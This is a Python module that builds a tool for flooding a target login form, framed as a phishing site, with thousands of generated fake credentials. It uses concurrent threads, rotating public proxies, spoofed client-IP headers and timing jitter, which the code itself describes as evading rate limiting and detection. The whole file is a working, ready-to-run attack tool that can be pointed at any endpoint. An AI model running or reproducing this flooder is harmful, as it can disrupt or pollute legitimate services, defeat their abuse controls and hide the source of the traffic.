import requests
import random
import string
import logging
import concurrent.futures
import time
from urllib.parse import urlparse
from typing import List, Dict, Optional, Tuple

# Try to import DOMScanner for field detection
try:
    from app.core.dom_scanner import DOMScanner
    DOM_SCANNER_AVAILABLE = True
except ImportError:
    DOM_SCANNER_AVAILABLE = False

class ProxyRotator:
    """Manages free proxy rotation for stealth attacks."""
    
    def __init__(self):
        self.proxies: List[str] = []
        self.current_index = 0
        self.failed_proxies: set = set()
        self._load_default_proxies()
    
    def _load_default_proxies(self):
        """Load commonly available free proxy endpoints."""
        # These are public proxy endpoints that rotate IPs
        default_proxies = [
            None,  # Direct connection (fallback)
        ]
        self.proxies = default_proxies
    
    def fetch_free_proxies(self) -> List[str]:
        """Fetch fresh proxies from public API (best effort)."""
        try:
            # Multiple proxy list sources for redundancy
            urls = [
                "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            ]
            fresh_proxies = []
            for url in urls:
                try:
                    resp = requests.get(url, timeout=10)
                    if resp.status_code == 200:
                        lines = [p.strip() for p in resp.text.strip().split('\n') if ':' in p.strip()]
                        fresh_proxies.extend([f"http://{p}" for p in lines[:20]])  # Top 20
                        break
                except (requests.RequestException, ValueError):
                    # Network error or invalid proxy format - try next URL
                    continue
            if fresh_proxies:
                self.proxies = [None] + fresh_proxies  # Keep None as fallback
                logging.info(f"[PROXY] Loaded {len(fresh_proxies)} fresh proxies")
            return fresh_proxies
        except Exception as e:
            logging.warning(f"[PROXY] Could not fetch proxies: {e}")
            return []
    
    def get_next_proxy(self) -> Optional[Dict[str, str]]:
        """Get next proxy in rotation."""
        if not self.proxies:
            return None
        
        # Skip failed proxies
        attempts = 0
        while attempts < len(self.proxies):
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
            
            if proxy not in self.failed_proxies:
                if proxy is None:
                    return None
                return {"http": proxy, "https": proxy}
            attempts += 1
        
        return None  # All proxies failed
    
    def mark_failed(self, proxy_dict: Optional[Dict[str, str]]):
        """Mark a proxy as failed."""
        if proxy_dict and proxy_dict.get("http"):
            self.failed_proxies.add(proxy_dict["http"])


class OffensiveDefense:
    def __init__(self, use_proxies: bool = True):
        # Professional-looking fake data patterns
        self.user_prefixes = ["admin", "support", "billing", "security", "info", "contact", "office", "hr", "sales", 
                             "marketing", "dev", "ops", "finance", "legal", "it", "helpdesk", "service", "noreply"]
        self.domains = ["@gmail.com", "@yahoo.com", "@outlook.com", "@icloud.com", "@protonmail.com", 
                       "@company.com", "@corp.net", "@enterprise.org", "@business.io"]
        self.common_form_fields = {
            "user": ["user", "username", "email", "login", "id", "account", "userid", "mail"],
            "pass": ["pass", "password", "pwd", "secret", "p", "passwrd", "passwd"],
            "submit": ["submit", "login", "btn", "action", "verify", "signin", "authenticate"]
        }
        
        # Enhanced capabilities
        self.proxy_rotator = ProxyRotator() if use_proxies else None
        self.dom_scanner = DOMScanner() if DOM_SCANNER_AVAILABLE else None
        self.session = requests.Session()
        self.session.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
        })

    def _generate_fake_creds(self) -> Tuple[str, str, Dict]:
        """Generates realistic-looking fake credentials with metadata."""
        prefix = random.choice(self.user_prefixes)
        suffix = "".join(random.choices(string.digits, k=random.randint(2, 5)))
        domain = random.choice(self.domains)
        
        email = f"{prefix}{suffix}{domain}"
        
        # Complex passwords to waste hacker's cracking resources
        password_chars = string.ascii_letters + string.digits + "!@#$%^&*"
        password = "".join(random.choices(password_chars, k=random.randint(12, 20)))
        
        # Metadata to make it look more real
        metadata = {
            "fingerprint": "".join(random.choices(string.hexdigits, k=32)),
            "session_id": "".join(random.choices(string.ascii_lowercase + string.digits, k=16)),
            "timestamp": str(int(time.time()) - random.randint(0, 86400)),  # Random time in last 24h
            "ip": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "ua": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
            ])
        }
        
        return email, password, metadata

    def _extract_form_fields(self, hacker_url: str) -> Dict[str, str]:
        """Use DOM scanner to extract actual form fields from target page."""
        if not self.dom_scanner:
            return {}
        
        try:
            # Quick DOM scan to find forms
            result = self.dom_scanner.scan(hacker_url)
            fields = {}
            
            # If forms found, try to determine field names
            if result["metadata"].get("forms_found", 0) > 0:
                # Use common patterns - the scanner found forms
                # In production, you'd parse the actual form HTML
                fields["form_detected"] = True
                
            return fields
        except Exception as e:
            logging.debug(f"[DOM] Field extraction failed: {e}")
            return {}

    def _build_payload(self, email: str, password: str, metadata: Dict, custom_fields: Dict = None) -> Dict:
        """Build comprehensive payload with field variants."""
        payload = {
            # User field variants - covers most form naming conventions
            "username": email,
            "email": email,
            "login": email,
            "user": email,
            "userid": email,
            "mail": email,
            "account": email,
            "id": email,
            "uname": email,
            
            # Password field variants
            "password": password,
            "pass": password,
            "pwd": password,
            "passwrd": password,
            "passwd": password,
            "secret": password,
            "p": password,
            
            # Common additional fields
            "submit": "Login",
            "action": "login",
            "signin": "Sign In",
            "authenticate": "true",
            "remember": "on",
            "csrf_token": metadata["fingerprint"][:16],
            "session": metadata["session_id"],
            "timestamp": metadata["timestamp"],
            
            # Fake device fingerprinting
            "fingerprint": metadata["fingerprint"],
            "device_id": metadata["fingerprint"][:16],
            "browser": "Chrome",
            "os": random.choice(["Windows 10", "Windows 11", "MacOS", "Linux"]),
            "screen": "1920x1080",
            "timezone": random.choice(["America/New_York", "Europe/London", "Asia/Tokyo"]),
            "language": "en-US",
            "java_enabled": "false",
            "cookies_enabled": "true",
        }
        
        if custom_fields:
            payload.update(custom_fields)
            
        return payload

    def _send_single_request(self, hacker_url: str, proxy_dict: Optional[Dict], retry_count: int = 2) -> Tuple[bool, Optional[Dict]]:
        """Send a single pollution request with retry logic."""
        email, password, metadata = self._generate_fake_creds()
        payload = self._build_payload(email, password, metadata)
        
        headers = {
            "User-Agent": metadata["ua"],
            "Referer": hacker_url,
            "X-Forwarded-For": metadata["ip"],
            "X-Real-IP": metadata["ip"],
            "CF-Connecting-IP": metadata["ip"],
            "Origin": hacker_url.rsplit('/', 1)[0],
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        for attempt in range(retry_count + 1):
            try:
                # Jitter to evade rate limiting
                if attempt > 0:
                    time.sleep(random.uniform(0.1, 0.5))
                
                response = self.session.post(
                    hacker_url, 
                    data=payload, 
                    headers=headers, 
                    proxies=proxy_dict,
                    timeout=5,
                    allow_redirects=True
                )
                
                success = response.status_code in [200, 201, 301, 302, 307, 308]
                return success, proxy_dict
                
            except requests.exceptions.ProxyError:
                if self.proxy_rotator and proxy_dict:
                    self.proxy_rotator.mark_failed(proxy_dict)
                return False, proxy_dict
            except requests.exceptions.Timeout:
                continue  # Retry on timeout
            except Exception:
                if attempt == retry_count:
                    return False, proxy_dict
                continue
        
        return False, proxy_dict

    def flood_hacker_database(self, hacker_url: str, count: int = 10000, max_workers: int = 50, 
                             use_proxies: bool = True, jitter_ms: Tuple[int, int] = (50, 200)) -> Dict:
        """
        Enhanced pollution attack with proxy rotation and field detection.
        
        Args:
            hacker_url: Target phishing form endpoint
            count: Number of fake credentials to send
            max_workers: Thread pool size
            use_proxies: Enable proxy rotation
            jitter_ms: Random delay range between requests (min, max)
            
        Returns:
            Dict with success metrics and stats
        """
        logging.warning(f"[!!!] OFFENSIVE DEFENSE: Initiating enhanced pollution attack on {hacker_url}")
        logging.warning(f"[*] Target Volume: {count:,} fake credentials | Workers: {max_workers}")
        
        # Pre-fetch fresh proxies if enabled
        if use_proxies and self.proxy_rotator:
            self.proxy_rotator.fetch_free_proxies()
            logging.info(f"[PROXY] Rotation enabled with {len(self.proxy_rotator.proxies)} endpoints")
        
        # Try to extract actual form fields
        custom_fields = self._extract_form_fields(hacker_url)
        if custom_fields:
            logging.info(f"[DOM] Form fields detected - enhancing payload precision")
        
        stats = {
            "total_sent": 0,
            "successful": 0,
            "failed": 0,
            "proxy_rotations": 0,
            "start_time": time.time()
        }
        
        def send_with_rotation():
            # Get fresh proxy for each request
            proxy_dict = None
            if use_proxies and self.proxy_rotator:
                proxy_dict = self.proxy_rotator.get_next_proxy()
            
            # Jitter to evade rate detection
            if jitter_ms[1] > 0:
                time.sleep(random.uniform(jitter_ms[0]/1000, jitter_ms[1]/1000))
            
            success, used_proxy = self._send_single_request(hacker_url, proxy_dict)
            
            if used_proxy and used_proxy != proxy_dict:
                stats["proxy_rotations"] += 1
            
            return success

        # Execute with controlled concurrency
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            batch_size = 250  # Smaller batches for better proxy rotation
            
            for batch_start in range(0, count, batch_size):
                current_batch = min(batch_size, count - batch_start)
                futures = [executor.submit(send_with_rotation) for _ in range(current_batch)]
                
                for future in concurrent.futures.as_completed(futures):
                    stats["total_sent"] += 1
                    if future.result():
                        stats["successful"] += 1
                    else:
                        stats["failed"] += 1
                
                # Progress logging
                progress = min(batch_start + current_batch, count)
                success_rate = (stats["successful"] / stats["total_sent"] * 100) if stats["total_sent"] > 0 else 0
                logging.info(f"[*] Progress: {progress:,}/{count:,} | Success: {success_rate:.1f}% | Proxies: {stats['proxy_rotations']}")
        
        stats["duration"] = time.time() - stats["start_time"]
        stats["rps"] = stats["total_sent"] / stats["duration"] if stats["duration"] > 0 else 0
        
        logging.warning(f"[+] POLLUTION COMPLETE: {stats['successful']:,} successful injections")
        logging.warning(f"[+] Stats: {stats['rps']:.1f} req/sec | Duration: {stats['duration']:.1f}s | Proxy rotations: {stats['proxy_rotations']}")
        
        return stats

if __name__ == "__main__":
    # Test the enhanced offensive defense
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    attacker = OffensiveDefense(use_proxies=False)  # Disable proxies for local testing
    
    # Generate test stats
    print("\n" + "="*60)
    print("OFFENSIVE DEFENSE ENGINE - TEST MODE")
    print("="*60)
    
    # Test credential generation
    email, password, meta = attacker._generate_fake_creds()
    print(f"\n[TEST] Sample Fake Credential:")
    print(f"  Email: {email}")
    print(f"  Password: {password[:4]}{'*' * (len(password)-4)}")
    print(f"  Fingerprint: {meta['fingerprint'][:16]}...")
    
    # Test payload building
    payload = attacker._build_payload(email, password, meta)
    print(f"\n[TEST] Payload fields: {len(payload)}")
    print(f"  User variants: {[k for k in payload.keys() if any(x in k for x in ['user', 'email', 'login', 'mail'])]}")
    print(f"  Password variants: {[k for k in payload.keys() if any(x in k for x in ['pass', 'pwd', 'secret'])]}")
    
    print("\n[OK] Offensive Defense Engine Ready")
    print("="*60)
